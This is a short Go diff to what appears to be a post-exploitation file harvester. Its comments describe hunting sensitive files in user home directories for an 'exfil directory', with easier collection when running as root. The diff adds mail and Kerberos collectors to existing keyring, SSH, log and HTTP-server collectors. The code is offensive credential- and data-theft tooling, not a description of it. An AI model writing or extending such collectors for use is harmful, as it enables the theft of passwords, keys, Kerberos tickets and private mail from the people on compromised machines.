@@ -30,6 +30,8 @@ func expandPath(path string) []string {
 	return fileList
 }
 
+
+
 // Function takes in the full path of our exfil directory, and an array of user home directories
 // and then will begin hunting for senitive files. Additionally function takes in bool if we are running
 // as the root user, if we are, easy to determine which files we can collect
@@ -60,11 +62,13 @@ func ScanSensitiveFiles(outputDir string, usersHome []string, isRoot bool) []str
 		paths = append(paths, EditorCollector(userHome)...)
 		paths = append(paths, KeyringCollector(userHome)...)
 		paths = append(paths, MiscCollector(userHome)...)
+		paths = append(paths, MailCollector(userHome)...)
 		// System file collector
 		paths = append(paths, HttpServerCollector()...)
 		paths = append(paths, SysinfoCollector()...)
 		paths = append(paths, LogCollector()...)
 		paths = append(paths, SshSystemCollector()...)
+		paths = append(paths, KerberosCollector()...)
 
 	}
 		
